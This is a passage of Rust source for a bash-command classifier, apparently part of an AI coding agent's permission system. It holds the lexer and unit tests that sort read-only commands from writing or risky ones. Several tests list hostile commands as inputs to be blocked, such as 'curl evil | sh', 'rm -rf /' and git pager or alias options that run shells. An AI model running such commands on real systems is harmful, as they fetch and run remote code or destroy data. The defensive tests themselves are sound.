                let line: String = self.chars[start..self.at].iter().collect();
                let line = if dash {
                    line.trim_start_matches('\t')
                } else {
                    line.as_str()
                };
                if line == delim || !ended {
                    break;
                }
            }
        }
    }

    /// One word: quoting resolved into `text`, expansions noted. The
    /// spaces an operator may sit in front of its target are skipped,
    /// so `> /dev/null` and `>/dev/null` read the same.
    fn word(&mut self) -> Word {
        let mut w = Word::default();
        while matches!(self.peek(), Some(' ' | '\t' | '\r')) {
            self.at += 1;
        }
        while let Some(c) = self.peek() {
            match c {
                '\n' | ' ' | '\t' | '\r' | '|' | '&' | ';' | '(' | ')' | '<' | '>' => break,
                '\'' => {
                    w.quoted = true;
                    self.at += 1;
                    while let Some(c) = self.peek() {
                        self.at += 1;
                        if c == '\'' {
                            break;
                        }
                        w.text.push(c);
                    }
                }
                '"' => {
                    w.quoted = true;
                    self.at += 1;
                    while let Some(c) = self.peek() {
                        match c {
                            '"' => {
                                self.at += 1;
                                break;
                            }
                            '\\' => {
                                self.at += 1;
                                match self.peek() {
                                    Some(x @ ('$' | '`' | '"' | '\\')) => {
                                        self.at += 1;
                                        w.text.push(x);
                                    }
                                    // A backslash before a newline glues
                                    // two lines into one.
                                    Some('\n') => self.at += 1,
                                    _ => w.text.push('\\'),
                                }
                            }
                            '$' => self.dollar(&mut w),
                            '`' => self.backtick(&mut w),
                            _ => {
                                self.at += 1;
                                w.text.push(c);
                            }
                        }
                    }
                }
                '\\' => {
                    self.at += 1;
                    match self.peek() {
                        Some('\n') => self.at += 1,
                        Some(x) => {
                            self.at += 1;
                            w.text.push(x);
                        }
                        None => w.text.push('\\'),
                    }
                }
                '$' => self.dollar(&mut w),
                '`' => self.backtick(&mut w),
                _ => {
                    self.at += 1;
                    w.text.push(c);
                }
            }
        }
        w
    }

    /// At `$`: a variable, or a command substitution the classifier
    /// will see into.
    fn dollar(&mut self, w: &mut Word) {
        self.at += 1;
        match self.peek() {
            None => w.text.push('$'),
            Some('(') => {
                self.at += 1;
                let sub = self.sub_word();
                w.broken |= sub.broken;
                w.subs.push(sub.text);
            }
            Some('{') => {
                w.var = true;
                self.at += 1;
                let mut depth = 1usize;
                while depth > 0 {
                    match self.peek() {
                        None => return,
                        Some('}') => {
                            depth -= 1;
                            self.at += 1;
                        }
                        Some('{') => {
                            depth += 1;
                            self.at += 1;
                        }
                        // A substitution inside the braces runs too.
                        Some('$') if self.next_is('(') => {
                            self.at += 2;
                            let sub = self.sub_word();
                            w.broken |= sub.broken;
                            w.subs.push(sub.text);
                        }
                        Some(_) => self.at += 1,
                    }
                }
            }
            Some(c) if c.is_alphanumeric() || c == '_' => {
                w.var = true;
                while matches!(self.peek(), Some(c) if c.is_alphanumeric() || c == '_') {
                    self.at += 1;
                }
            }
            // $?, $#, $$ and friends.
            Some(_) => {
                w.var = true;
                self.at += 1;
            }
        }
    }

    /// A backtick substitution: its text, escapes unread, for the
    /// classifier to recurse into.
    fn backtick(&mut self, w: &mut Word) {
        self.at += 1;
        let start = self.at;
        while let Some(c) = self.peek() {
            match c {
                '\\' => {
                    self.at += 1;
                    if self.at < self.chars.len() {
                        self.at += 1;
                    }
                }
                '`' => break,
                _ => self.at += 1,
            }
        }
        w.subs.push(self.chars[start..self.at].iter().collect());
        if self.peek() == Some('`') {
            self.at += 1;
        } else {
            // Never closed: the line is not shell.
            w.broken = true;
        }
    }

    /// The command inside a `$( ... )` or `<( ... )`: its raw text, as
    /// a word the classifier recurses into.
    fn sub_word(&mut self) -> Word {
        let start = self.at;
        let mark = self.out.len();
        let heredocs = self.heredocs.len();
        let close = self.run(Some(')'));
        self.out.truncate(mark);
        // A heredoc an unclosed substitution leaves pending belongs
        // to it, not to the line it sits in.
        self.heredocs.truncate(heredocs);
        let end = close.map_or(self.chars.len(), |p| p - 1);
        Word {
            text: self.chars[start..end].iter().collect(),
            broken: close.is_none(),
            ..Word::default()
        }
    }

    fn next_is(&self, c: char) -> bool {
        self.chars.get(self.at + 1).copied() == Some(c)
    }

    fn take_if(&mut self, c: char) -> bool {
        if self.peek() == Some(c) {
            self.at += 1;
            true
        } else {
            false
        }
    }

    fn peek(&self) -> Option<char> {
        self.chars.get(self.at).copied()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::rules::default_bash_allow;

    fn allows(cmd: &str) -> bool {
        classify(cmd, &default_bash_allow(), &[]).allowed
    }

    fn riskiest(cmd: &str) -> Option<String> {
        classify(cmd, &default_bash_allow(), &[])
            .riskiest
            .map(|w| w.join(" "))
    }

    /// `command -v` looks a command up and runs nothing, so a probe for a
    /// tool reads as `which` does; `command` running one still asks.
    #[test]
    fn command_v_is_a_lookup_and_command_running_one_is_not() {
        assert!(allows("command -v rg"));
        assert!(allows("command -v rg || echo absent"));
        assert!(allows("command -v git && git rev-parse --show-toplevel"));
        assert!(!allows("command rm -rf target"));
        assert!(!allows("command -p rm -rf target"));
        assert!(!allows("command -v rg; rm -rf target"));
    }

    /// `scan` is the parts, not the verdict: the words of every segment
    /// in order, so a caller can recognise an exact command. The kinds
    /// are the same ones the whole line's verdict folds.
    #[test]
    fn the_scan_splits_a_line_into_its_classified_segments() {
        let segs = scan("cd /repo && cargo clippy --all-targets -- -D warnings");
        assert_eq!(segs.len(), 2);
        assert_eq!(segs[0].text, "cd /repo");
        assert_eq!(segs[0].words, vec!["cd", "/repo"]);
        assert_eq!(segs[0].kind, Kind::Harmless);
        assert!(segs[0].redirects.is_empty());
        assert_eq!(
            segs[1].words,
            vec!["cargo", "clippy", "--all-targets", "--", "-D", "warnings"]
        );
        // An allow-listed command with no writing flag is harmless:
        // `Kind::ReadOnly` is the least of the kinds and only ever a
        // line's starting point, so `classify_segment` never folds down
        // to it (the `Worst` it folds into starts at `Harmless`).
        assert_eq!(segs[1].kind, Kind::Harmless);

        // `cargo fmt` is allow-listed too; the caller that needs it as
        // an edit decides that, not the scanner.
        let fmt = scan("cargo fmt");
        assert_eq!(fmt.len(), 1);
        assert_eq!(fmt[0].text, "cargo fmt");
        assert_eq!(fmt[0].kind, Kind::Harmless);

        // A command the rules cannot read is `Unknown`; an assignment
        // on its own is harmless.
        assert_eq!(scan("flake8 .")[0].kind, Kind::Unknown);
        assert_eq!(scan("LOG=/tmp/x")[0].kind, Kind::Harmless);
    }

    /// The write's source is kept: a caller that exempts a redirection
    /// has to know whether the segment's own command writes too (issue
    /// #56's review). The kind is the same `Write` either way.
    #[test]
    fn the_scan_says_whether_the_write_is_the_commands_own() {
        let redirected = scan("sed -i 's/a/b/' crates/runtime/src/checks/mod.rs > /tmp/d");
        assert_eq!(redirected.len(), 1);
        assert_eq!(redirected[0].kind, Kind::Write);
        assert_eq!(redirected[0].redirects, vec!["/tmp/d"]);
        assert!(
            redirected[0].write_from_command,
            "the flag writes, the redirection just collects it"
        );

        let substituted = scan("echo $(sed -i 's/a/b/' crates/runtime/src/checks/mod.rs) > /tmp/d");
        assert_eq!(substituted.len(), 1);
        assert_eq!(substituted[0].kind, Kind::Write);
        assert!(
            substituted[0].write_from_command,
            "the `$(…)` writes, its carrier only prints"
        );

        // A redirection on its own is a write of the redirection's, and
        // a read-only segment writes nowhere at all.
        let plain = scan("cargo test > /tmp/gate.log 2>&1");
        assert_eq!(plain[0].kind, Kind::Write);
        assert!(!plain[0].write_from_command);
        let read = scan("git log --oneline -5");
        assert_eq!(read[0].kind, Kind::Harmless);
        assert!(!read[0].write_from_command);
    }

    /// The redirection targets are kept, and a descriptor on its own is
    /// not a word: not an edit's business to guess from `text`.
    #[test]
    fn the_scan_keeps_redirection_targets_and_drops_bare_descriptors() {
        let segs = scan("cargo test > /tmp/gate.log 2>&1");
        assert_eq!(segs.len(), 1);
        // `2>&1` duplicates a descriptor and names no file, so it is not
        // among the targets.
        assert_eq!(segs[0].redirects, vec!["/tmp/gate.log"]);
        assert_eq!(segs[0].words, vec!["cargo", "test"]);
        assert_eq!(segs[0].words, segs[0].text.split(' ').collect::<Vec<_>>());
        assert_eq!(segs[0].text, "cargo test");
        // A redirection to a file is a write segment.
        assert_eq!(segs[0].kind, Kind::Write);

        // Relative target, same table: the caller resolves it.
        let rel = scan("cargo test > gate.log");
        assert_eq!(rel[0].redirects, vec!["gate.log"]);
    }

    /// A chained call is several segments; the words keep the line's
    /// shape, so `echo "exit=$?"` reads as itself and not as the test's.
    #[test]
    fn the_scan_reads_a_chain_and_a_heredoc_as_the_words_written() {
        let segs = scan("cargo test > /tmp/x.log 2>&1; echo \"exit=$?\"");
        assert_eq!(segs.len(), 2);
        // A substitution in a word is folded and shows nothing of its
        // own: the word reads as the text around it.
        assert_eq!(segs[1].words, vec!["echo", "exit="]);

        // A heredoc is one segment: the body is not a word, the marker
        // reads as a target of its own, and the empty segment the
        // terminator leaves behind is dropped.
        let heredoc = scan("cat > /tmp/msg.txt <<'MSG'\nbody line\nMSG\n");
        assert_eq!(heredoc.len(), 1);
        assert_eq!(heredoc[0].words, vec!["cat"]);
        assert_eq!(heredoc[0].redirects, vec!["/tmp/msg.txt", "MSG"]);
        assert!(!heredoc[0].text.contains("body"));

        // A chain is one segment each, `&&` not among the words.
        let chain = scan("cargo fmt && cargo test > /tmp/x.log 2>&1");
        assert_eq!(chain.len(), 2);
        assert_eq!(chain[0].words, vec!["cargo", "fmt"]);
        assert_eq!(chain[1].words, vec!["cargo", "test"]);
        assert_eq!(chain[1].redirects, vec!["/tmp/x.log"]);

        // A digit target of a plain redirection is a file named `1`.
        assert_eq!(scan("echo x > 1")[0].redirects, vec!["1"]);
        assert_eq!(scan("echo x 2>1")[0].redirects, vec!["1"]);
        assert!(scan("echo x >&2")[0].redirects.is_empty());
    }

    /// E7 asks whether a pipe carried a run's output away, so `piped`
    /// has to sit on the segment the pipe feeds, not on the one before
    /// it — the wrong side would name the `cargo test` line as a filter.
    #[test]
    fn the_scan_marks_the_segment_a_pipe_feeds() {
        let piped = scan("cargo test -p aigentic-runtime the_scan 2>&1 | grep -E x");
        assert_eq!(piped.len(), 2);
        assert_eq!(piped[1].words, vec!["grep", "-E", "x"]);
        assert_eq!(
            piped.iter().map(|s| s.piped).collect::<Vec<_>>(),
            vec![false, true]
        );

        // A `;` and a redirection are not a pipe.
        let split = scan("cargo test x > /tmp/o; echo done");
        assert_eq!(
            split.iter().map(|s| s.piped).collect::<Vec<_>>(),
            vec![false, false]
        );
    }

    /// The `bash` row's text (issue #21): the segment that carries the
    /// line's work, redirections off — not the riskiest segment the
    /// approval menu asks about.
    #[test]
    fn the_main_segment_is_the_work_of_a_chain() {
        assert_eq!(
            main_segment(
                "cargo test -p aigentic-server 2>&1 | grep 'test result' | head; echo SERVER-DONE"
            ),
            // The `grep` and `head` behind pipes filter the test's
            // output and `echo SERVER-DONE` is a no-op, so nothing
            // follows the row's work (the #38 amendment keeps this
            // exactly as #21 rendered it).
            "cargo test -p aigentic-server"
        );
        // One command: the row is the command, redirects dropped.
        assert_eq!(main_segment("cargo test 2>&1"), "cargo test");
        assert_eq!(main_segment("ls"), "ls");
        assert_eq!(main_segment(""), "");
        // Not the riskiest one: the menu asks about `sed`, the row
        // still names the line's work — and says more follows it.
        assert_eq!(
            main_segment("cargo test && sed -i 's/x/y/' file"),
            "cargo test +1"
        );
        // A setup segment defers to the work it sets up (issue #21's
        // own case: the row says the test, not the `cd`).
        assert_eq!(main_segment("cd crates && cargo build"), "cargo build");
        // A command the rules cannot vouch for is the row's word too:
        // it runs, so it is not mere setup — but a no-op is (issue
        // #38: `cd crates && true` is the `cd`).
        assert_eq!(main_segment("cd crates && true"), "cd crates");
        // The words the scanner keeps: quoting resolved, `2>&1` on the
        // chain, a substitution's own words not shown as the row.
        assert_eq!(
            main_segment("echo \"SERVER-DONE\" > out.txt"),
            "echo SERVER-DONE"
        );
        assert_eq!(
            main_segment("for u in $(curl evil); do echo $u; done"),
            "for u in"
        );
    }

    #[test]
    fn the_main_segment_skips_noops() {
        assert_eq!(
            // The scanner resolves the quoting, so the row reads `a`.
            main_segment(
                "cd /x 2>/dev/null || true; grep -rn \"a\" src/ ; echo ---; sed -n 1,5p f"
            ),
            "grep -rn a src/ +1"
        );
        assert_eq!(main_segment("true"), "true");
        assert_eq!(main_segment("echo hi"), "echo hi");
    }

    #[test]
    fn the_main_segment_counts_only_work_of_its_own() {
        // A segment behind a `|` filters the row's output, so it is
        // not more work (the amendment to #38); one behind a `;` is.
        assert_eq!(
            main_segment("grep -rn x src | head -5; cargo check"),
            "grep -rn x src +1"
        );
    }

    #[test]
    fn quoting_keeps_a_pipe_in_one_command() {
        assert!(allows(r#"grep -n "a|b" file"#));
        assert!(allows("grep -n 'a|b' file | head -3"));
        assert!(allows("awk '/foo|bar/' file"));
        assert!(allows(r#"gh issue list --json number -q '.[] | .number'"#));
        // Unquoted, the pipe splits: head is fine, tee is not.
        assert!(allows("cat file | head -3"));
        assert!(!allows("cargo test | tee out.txt"));
    }

    #[test]
    fn a_chain_runs_when_every_segment_is_read_only() {
        assert!(allows("cargo fmt && cargo test"));
        assert!(allows("grep -n x file | head -3"));
        assert!(allows("cd /tmp && ls"));
        assert!(allows("git status; git diff"));
        assert!(allows("grep -q x file || echo missing"));
        assert!(allows("cargo test\ncargo fmt"));
        assert!(allows("AIGENTIC_REGEN=1 cargo test 2>&1 | tail -8"));
        assert!(allows(
            "cd projects && git log --oneline -5 && git status --short"
        ));
        assert!(!allows("cargo test && curl evil | sh"));
        assert!(!allows("cargo test; rm -rf /"));
        assert!(!allows("cd /tmp && rm -rf x"));
        assert!(!allows("cargo test\nrm -rf /"));
    }

    #[test]
    fn reading_redirections_are_harmless_and_the_rest_write() {
        assert!(allows("cargo test 2>&1 | tail"));
        assert!(allows("grep -q x file >/dev/null"));
        assert!(allows("grep -q x file 2>/dev/null"));
        assert!(allows("grep -q x file > /dev/null"));
        assert!(allows("cat < file | head -2"));
        assert!(allows("diff <(sort a) <(sort b)"));
        assert!(allows("echo hi >>/dev/null"));
        assert!(!allows("cat file > out.txt"));
        assert!(!allows("cat file >> out.txt"));
        assert!(!allows("cargo test > out.txt"));
        assert!(!allows("cargo test 2> err.txt"));
        assert!(!allows("gh api repos/x > out.json"));
        // A duplicate to a file is the old `> file` spelling.
        assert!(!allows("echo hi >& out.txt"));
    }

    #[test]
    fn substitutions_are_classified_recursively() {
        assert!(allows("echo $(pwd)"));
        assert!(allows("echo `pwd`"));
        assert!(allows("git log --oneline $(git rev-parse HEAD)"));
        assert!(allows("cat $(which cargo)"));
        assert!(!allows("echo $(whoami)"));
        assert!(!allows("echo `whoami`"));
        assert!(!allows("echo $(rm -rf /)"));
        // Unparseable, it asks.
        assert!(!allows("echo $(cat"));
        // The substitution's redirection is a write of its own.
        assert!(!allows("echo $(cat file > out.txt)"));
        // What the prefix grants is the substitution's own command.
        assert_eq!(riskiest("echo $(git push)"), Some("git push".into()));
    }

    /// The field a caller reads a substitution's own commands out of:
    /// source order, the raw text, an unclosed one included, and no
    /// process substitution.
    #[test]
    fn scan_carries_each_substitution_text() {
        let subs = |command: &str| scan(command)[0].subs.clone();
        assert_eq!(
            subs("echo \"--- count: $(git rev-list --count 3e99082..HEAD)\""),
            ["git rev-list --count 3e99082..HEAD"]
        );
        assert_eq!(
            subs("echo `git log --oneline -1`"),
            ["git log --oneline -1"]
        );
        assert_eq!(
            subs("echo $(git log --oneline -1) $(git status --short)"),
            ["git log --oneline -1", "git status --short"]
        );
        assert_eq!(
            subs("echo $(git rev-list --count $(git rev-parse HEAD))"),
            ["git rev-list --count $(git rev-parse HEAD)"]
        );
        assert_eq!(subs("echo hi > $(mktemp)"), ["mktemp"]);
        assert_eq!(subs("echo $(cat"), ["cat"]);
        assert!(subs("cat <(git log --oneline)").is_empty());
    }

    #[test]
    fn sed_is_read_only_without_its_writing_flags() {
        assert!(allows("sed -n '187,227p' crates/tui/src/app/menu.rs"));
        assert!(allows("sed 's/old/new/' file"));
        assert!(allows("sed --silent -n 1,20p file"));
        assert!(!allows("sed -i '' 's/x/y/' file"));
        assert!(!allows("sed -i.bak 's/x/y/' file"));
        assert!(!allows("sed -ni 's/x/y/' file"));
        assert!(!allows("sed --in-place 's/x/y/' file"));
        assert!(!allows("sed -n 's/x/y/w out.txt' file"));
        assert!(!allows("sed -n 's/x/y/e' file"));
        assert!(!allows("sed -n 1,20p $range file"));
    }

    #[test]
    fn find_lists_without_deleting_or_running() {
        assert!(allows("find crates -name '*.rs'"));
        assert!(allows("find . -type f | head -20"));
        assert!(!allows("find . -name '*.tmp' -delete"));
        assert!(!allows("find . -exec rm {} \\;"));
        assert!(!allows("find . -execdir rm {} +"));
        assert!(!allows("find . -ok rm {} \\;"));
        assert!(!allows("find . -fprint out.txt"));
        assert!(!allows("find . -fls out.txt"));
    }

    #[test]
    fn git_branch_lists_without_creating_or_moving() {
        assert!(allows("git branch --show-current"));
        assert!(allows("git branch -a"));
        assert!(allows("git branch --contains HEAD | head -3"));
        assert!(!allows("git branch -d topic"));
        assert!(!allows("git branch -D topic"));
        assert!(!allows("git branch -m renamed"));
        assert!(!allows("git branch --delete topic"));
        assert!(!allows("git branch new-branch"));
    }

    #[test]
    fn git_grep_reads_without_running_a_program() {
        assert!(allows("git grep -n verdict -- crates/"));
        assert!(allows("git grep -n verdict"));
        assert!(allows("git grep -n verdict | grep -i verdict | head"));
        assert!(allows("git grep -e 'git grep' -- docs/"));
        assert!(allows("git grep --cached -l TODO"));
        assert!(allows("git grep -n verified && cargo test"));
        assert!(allows("git grep --no-textconv -n verdict -- a.bin"));

        // `-O` and `--textconv` name a program to run.
        assert!(!allows("git grep -O vim verdict"));
        assert!(!allows("git grep -Ovim verdict"));
        assert!(!allows("git grep -nOcat verdict"));
        assert!(!allows("git grep --open-files-in-pager=vim verdict"));
        assert!(!allows("git grep --open-files-in-pager vim verdict"));
        assert!(!allows("git grep --open verdict"));
        assert!(!allows("git grep --textconv -n verdict -- a.bin"));

        // An argument the rules cannot read might be one of the flags.
        assert!(!allows("git grep -n x \"$opt\""));
        assert!(!allows("git grep -n x \"$(cat opts)\""));
    }

    #[test]
    fn git_reflog_reads_without_expiring_or_deleting() {
        assert!(allows("git reflog"));
        assert!(allows("git reflog -8"));
        assert!(allows("git reflog show HEAD"));
        assert!(allows("git reflog show HEAD@{1}"));
        assert!(allows("git reflog --all"));
        assert!(allows("git reflog -n 5"));
        assert!(allows("git reflog --date=iso"));
        assert!(allows("git reflog list"));
        assert!(allows("git reflog -8 | head -3"));
        assert!(allows("git reflog | head -20"));
        assert!(allows("git reflog --no-pager -8"));
        assert!(allows("git --no-pager reflog -8"));
        assert!(allows("git reflog -8 && cargo test"));

        // The three subcommands that rewrite the log.
        assert!(!allows("git reflog expire"));
        assert!(!allows("git reflog expire --expire=now --all"));
        assert!(!allows("git reflog -n 3 expire --expire=now --all"));
        assert!(!allows("git reflog delete HEAD@{1}"));
        assert!(!allows("git reflog drop HEAD@{1}"));
        assert!(!allows("git reflog show drop"));
        assert!(!allows("git reflog 'expire'"));

        // The subcommand word is what the rules read, so one they cannot
        // read may be a writing one.
        assert!(!allows("git reflog $sub"));
        assert!(!allows("git reflog \"$(echo expire)\""));

        assert!(!allows(
            "git reflog expire --expire=now --all > /tmp/reflog.txt"
        ));
    }

    #[test]
    fn git_reflog_writes_only_through_its_subcommands() {
        let read = scan("git reflog -8");
        assert_eq!(read[0].kind, Kind::Harmless);
        assert!(!read[0].write_from_command);

        let show = scan("git reflog show HEAD");
        assert_eq!(show[0].kind, Kind::Harmless);
        assert!(!show[0].write_from_command);

        for command in [
            "git reflog expire --expire=now --all",
            "git reflog delete HEAD@{1}",
            "git reflog -n 3 expire --all",
        ] {
            let seg = scan(command);
            assert_eq!(seg[0].kind, Kind::Write, "{command}");
            assert!(seg[0].write_from_command, "{command}");
        }

        let redirected = scan("git reflog expire --expire=now --all > /tmp/reflog.txt");
        assert_eq!(redirected[0].kind, Kind::Write);
        assert!(redirected[0].write_from_command);

        assert_eq!(scan("git reflog $sub")[0].kind, Kind::Unknown);
    }

    #[test]
    fn git_grep_writes_only_through_its_program_flags() {
        let read = scan("git grep -n verdict -- crates/");
        assert_eq!(read[0].kind, Kind::Harmless);
        assert!(!read[0].write_from_command);

        let pager = scan("git grep -O vim verdict");
        assert_eq!(pager[0].kind, Kind::Write);
        assert!(pager[0].write_from_command);
        assert_eq!(
            scan("git grep --open-files-in-pager=vim verdict")[0].kind,
            Kind::Write
        );

        let textconv = scan("git grep --textconv -n verdict -- a.bin");
        assert_eq!(textconv[0].kind, Kind::Write);
        assert!(textconv[0].write_from_command);

        let off = scan("git grep --no-textconv -n verdict -- a.bin");
        assert_eq!(off[0].kind, Kind::Harmless);
        assert!(!off[0].write_from_command);

        assert_eq!(scan("git grep -n x \"$opt\"")[0].kind, Kind::Unknown);
    }

    /// A global option the table holds must change no verdict for a
    /// read row, or the classifier would be widening more than the rows.
    #[test]
    fn every_git_harmless_global_option_leaves_a_git_read_allowed() {
        let allow = default_bash_allow();
        for option in GIT_TRANSPARENT {
            assert!(option.starts_with('-'), "{option}");
            assert!(!option.contains(' '), "{option}");
        }

        let rows = [
            "git log -5",
            "git diff",
            "git status --short",
            "git reflog -8",
            "git show --stat",
            "git grep -n verdict -- crates/",
            "git branch --contains HEAD",
            "git rev-parse --show-toplevel",
        ];
        for option in GIT_TRANSPARENT {
            for row in rows {
                let pair: Vec<&str> = row.split_whitespace().take(2).collect();
                let pair = pair.join(" ");
                assert!(allow.contains(&pair), "{pair} is a read row");
                let rest = row.strip_prefix("git ").expect("every row starts with git");
                assert_eq!(
                    allows(&format!("git {option} {rest}")),
                    allows(row),
                    "{option} {row}"
                );
            }
        }

        // The walk repeats, and a chain is classified segment by segment.
        assert!(allows("git --no-pager --no-pager log -5"));
        assert!(allows(
            "git --no-pager --no-pager --literal-pathspecs log -5"
        ));
        assert!(allows("git --no-pager log -5 | head -3"));

        // The row the line matched is the row's text, not the line.
        let classified = classify("git --no-pager log -5", &allow, &[]);
        assert_eq!(classified.patterns, vec!["git log".to_owned()]);
    }

    /// The other half: an option that names a file, a directory, a config
    /// key or a program changes where git looks or what it runs, so it
    /// stays outside the table and the line keeps asking.
    #[test]
    fn git_global_options_that_change_what_runs_still_ask() {
        for command in [
            "git -c core.pager=sh log -5",
            "git -c alias.l='!sh -c ls' l",
            "git --config-env=core.pager=PAGER log -5",
            "git --exec-path=/tmp/x log",
            "git --git-dir=/tmp/g log",
            "git --work-tree=/tmp g status",
            "git --namespace=ns log",
            "git --attr-source=HEAD log",
            "git --super-prefix=x log",
            "git -C /tmp log -5",
            "git --bare log -5",
            "git --no-advice log -5",
            "git --no-pager",
            "git -P",
            "git --no-pager $sub",
            "git --no-pager \"$(echo log)\"",
            "git \"--no-pager\" log -5",
        ] {
            assert!(!allows(command), "{command}");
        }
    }

    /// Reading past the options must not hide a write from the writing
    /// flags or from E4's `write_from_command`.
    #[test]
    fn a_git_harmless_global_option_does_not_hide_a_write() {
        for command in [
            "git --no-pager branch -D topic",
            "git --no-pager branch -C topic",
            "git --no-pager grep -O vim verdict",
            "git --no-pager grep --textconv -n verdict -- a.bin",
            "git --no-pager reflog expire --expire=now --all",
            "git --no-pager reflog delete HEAD@{1}",
            "git --no-pager log --output=/tmp/x",
            "git --no-pager show --textconv",
        ] {
            assert!(!allows(command), "{command}");
            let seg = scan(command);
            assert_eq!(seg[0].kind, Kind::Write, "{command}");
            assert!(seg[0].write_from_command, "{command}");
        }

        for command in [
            "git --no-pager log -5",
            "git -P diff",
            "git --no-pager status --short",
        ] {
            let seg = scan(command);
            assert_eq!(seg[0].kind, Kind::Harmless, "{command}");
            assert!(!seg[0].write_from_command, "{command}");
        }
    }

    #[test]
    fn sort_and_git_diff_read_without_output_files() {
        assert!(allows("sort file | head -3"));
        assert!(allows("sort -u file"));
        assert!(!allows("sort file -o out.txt"));
        assert!(!allows("sort file --output=out.txt"));
        assert!(allows("git diff --stat"));
        assert!(!allows("git diff --output out.patch"));
        assert!(!allows("git diff --output=out.patch"));
    }

    #[test]
    fn git_diff_log_and_show_ask_only_through_textconv_and_output() {
        // The textconv filter runs the program repository data names, and
        // `-a`/`--text` ask for the same filter.
        assert!(!allows("git diff --textconv"));
        assert!(!allows("git diff --textconv HEAD~1"));
        assert!(!allows("git diff --text"));
        assert!(!allows("git diff -a"));
        assert!(!allows("git log -p --textconv"));
        assert!(!allows("git log --textconv -1"));
        assert!(!allows("git show --textconv"));
        assert!(!allows("git show --textconv HEAD"));

        // `--output` writes a file, as it does for `git diff`.
        assert!(!allows("git log --output=/tmp/x"));
        assert!(!allows("git show --output=/tmp/x"));

        // The plain forms, and `--no-textconv`, run no program.
        assert!(allows("git diff"));
        assert!(allows("git diff --stat"));
        assert!(allows("git diff HEAD~1"));
        assert!(allows("git diff --no-textconv"));
        assert!(allows("git log --oneline -3"));
        assert!(allows("git log -p --no-textconv"));
        assert!(allows("git show --stat"));
        assert!(allows("git show HEAD --no-textconv"));

        // A value-taking letter ends a cluster: the `a` in these is part
        // of the value git takes.
        assert!(allows("git log -Sparse"));
        assert!(allows("git log -Gmain"));
        assert!(allows("git log -L1,5:main.rs"));
    }

    #[test]
    fn git_diff_log_and_show_write_only_through_their_program_flags() {
        let read = scan("git diff --stat");
        assert_eq!(read[0].kind, Kind::Harmless);
        assert!(!read[0].write_from_command);

        for command in [
            "git diff --textconv",
            "git log -p --textconv",
            "git show --textconv",
            "git diff -a",
            "git log --output=/tmp/x",
            "git show --output=/tmp/x",
        ] {
            let seg = scan(command);
            assert_eq!(seg[0].kind, Kind::Write, "{command}");
            assert!(seg[0].write_from_command, "{command}");
        }

        for command in [
            "git diff --no-textconv",
            "git log -p --no-textconv",
            "git show --stat",
            "git log -Sparse",
            "git log -Gmain",
            "git log -L1,5:main.rs",
        ] {
            let seg = scan(command);
            assert_eq!(seg[0].kind, Kind::Harmless, "{command}");
            assert!(!seg[0].write_from_command, "{command}");
        }

        // A parameter may hold a writing flag, so it asks; a substitution
        // is read as a revision only when it prints one, so `git log
        // --oneline $(git rev-parse HEAD)` stays read-only.
        assert_eq!(scan("git log --oneline \"$opt\"")[0].kind, Kind::Unknown);
        assert_eq!(scan("git show \"$opt\"")[0].kind, Kind::Unknown);
    }

    #[test]
    fn git_log_and_show_ask_on_a_substitution_that_may_carry_a_writing_flag() {
        // A substitution's words land in the argument list as words, so
        // an inner command whose output the rules cannot read may print
        // one of the writing flags.
        assert!(!allows("git log -p $(echo --textconv)"));
        assert!(!allows("git show $(echo --output=/tmp/x)"));
        assert!(!allows("git log --oneline $(cat flags)"));
        assert!(!allows("git log $(some-script)"));
        assert!(!allows("git log `echo --textconv`"));
        assert!(!allows("git --no-pager log -p $(echo --textconv)"));
        assert!(!allows("git log --format=$(echo --textconv)"));
        assert!(!allows("git log $(echo $(git rev-parse HEAD))"));
        assert!(!allows("git show $(echo x; echo --output=/tmp/x)"));
        assert!(!allows("git log -p $(echo --textconv > /tmp/flags)"));
        assert!(!allows("git log -p $(printf -- '--textconv')"));

        // The inner line counts as a token printer only when it is one
        // segment the rules read in full: a second segment can print a
        // flag after the token, an unreadable word may hold one, and an
        // empty line names no command to read.
        assert!(!allows(
            "git log --oneline $(git rev-parse HEAD; echo --output=/tmp/x)"
        ));
        assert!(!allows("git log $(git rev-parse $flag)"));
        assert!(!allows("git log $()"));

        // A dash inside the query over-asks: git echoes an unresolved
        // argument, and no list of the options that print arbitrary text
        // is worth keeping.
        assert!(!allows("git log $(git rev-parse --short HEAD)"));
        assert!(!allows("git log --oneline $(git rev-list --count a..b)"));
    }

    #[test]
    fn git_log_and_show_keep_a_substitution_that_prints_a_revision_read_only() {
        assert!(allows("git log --oneline $(git rev-parse HEAD)"));
        assert!(allows("git log --oneline $(git rev-list HEAD)"));
        assert!(allows("git show $(git rev-parse HEAD)"));
        assert!(allows(
            "git show $(git rev-parse HEAD):crates/tui/src/app/engine.rs"
        ));
        assert!(allows("git log --oneline `git rev-parse HEAD`"));
        assert!(allows("git log -p $(git rev-parse HEAD 2>/dev/null)"));
        assert!(allows("git --no-pager log --oneline $(git rev-parse HEAD)"));
        assert!(allows("echo \"$(git rev-parse HEAD)\""));
    }

    #[test]
    fn git_log_and_show_read_a_flagged_substitution_as_unknown() {
        let flagged = scan("git log -p $(echo --textconv)");
        assert_eq!(flagged[0].kind, Kind::Unknown);
        assert!(!flagged[0].write_from_command);

        // A token printer folds read-only, which never lowers the
        // segment's own `Harmless`.
        assert_eq!(
            scan("git log --oneline $(git rev-parse HEAD)")[0].kind,
            Kind::Harmless
        );

        assert_eq!(
            riskiest("git log -p $(echo --textconv)"),
            Some("git log -p".to_owned())
        );
        assert!(
            classify("git log -p $(echo --textconv)", &default_bash_allow(), &[])
                .patterns
                .is_empty()
        );
    }

    #[test]
    fn awk_reads_without_in_place_programs_or_pipes() {
        assert!(allows("awk '{print $1}' file"));
        assert!(allows("awk -F: '{print $1}' /etc/passwd"));
        assert!(allows("awk '/foo|bar/' file"));
        assert!(!allows("awk -i inplace '{print $1}' file"));
        assert!(!allows("awk '{system(\"rm x\")}' file"));
        assert!(!allows("awk '{print > \"out.txt\"}' file"));
        assert!(!allows("awk '\"cmd\" | getline l' file"));
        // A comparison looks like a redirection; it asks.
        assert!(!allows("awk '$1 > 5' file"));
    }

    #[test]
    fn gh_api_reads_with_get() {
        assert!(allows("gh api repos/stevewerme/aigentic/issues/15"));
        assert!(allows("gh api repos/x --jq '.title'"));
        assert!(allows("gh api -X GET search/issues -f q='repo:x type:pr'"));
        assert!(!allows("gh api --method POST repos/x/labels -f name=y"));
        assert!(!allows("gh api repos/x/labels -f name=y"));
        assert!(!allows("gh api -X DELETE repos/x/labels/y"));
        assert!(!allows("gh api --input body.json repos/x"));
    }

    #[test]
